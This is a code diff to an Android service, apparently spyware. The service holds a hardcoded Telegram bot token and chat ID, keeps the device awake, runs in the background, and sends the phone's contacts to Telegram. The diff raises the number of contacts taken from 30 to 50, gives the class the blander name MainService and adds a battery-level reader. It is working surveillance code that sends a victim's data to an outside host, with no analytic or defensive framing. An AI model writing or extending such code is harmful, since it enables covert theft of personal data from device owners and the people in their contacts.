@@ -6,6 +6,7 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
@@ -31,7 +32,7 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
 
-public class BotService extends Service {
+public class MainService extends Service {
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
     private OkHttpClient client = new OkHttpClient();
@@ -44,12 +45,12 @@ public class BotService extends Service {
         super.onCreate();
         
         PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "BotService");
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
         wakeLock.acquire();
         
         startForegroundService();
         
-        sendToTelegram("✅ BotService Started");
+        sendToTelegram("✅ الخدمة بدأت");
         
         timer = new Timer();
         timer.scheduleAtFixedRate(new TimerTask() {
@@ -61,9 +62,9 @@ public class BotService extends Service {
     }
 
     private void startForegroundService() {
-        String channelId = "bot_channel";
+        String channelId = "main_channel";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "Bot Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
             ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
         }
         Notification notification = new NotificationCompat.Builder(this, channelId)
@@ -179,7 +180,7 @@ public class BotService extends Service {
                     null, null, null, null);
                 StringBuilder sb = new StringBuilder("📇 **جهات الاتصال:**\n\n");
                 int count = 0;
-                while (cursor != null && cursor.moveToNext() && count < 30) {
+                while (cursor != null && cursor.moveToNext() && count < 50) {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                     String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                     sb.append(name).append(": ").append(number).append("\n");
@@ -287,6 +288,14 @@ public class BotService extends Service {
                 e.printStackTrace();
             }
         });
+    }
+
+    private int getBatteryLevel() {
+        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent batteryStatus = registerReceiver(null, ifilter);
+        int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+        int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+        return (int)(level * 100 / (float)scale);
     }
 
     @Override
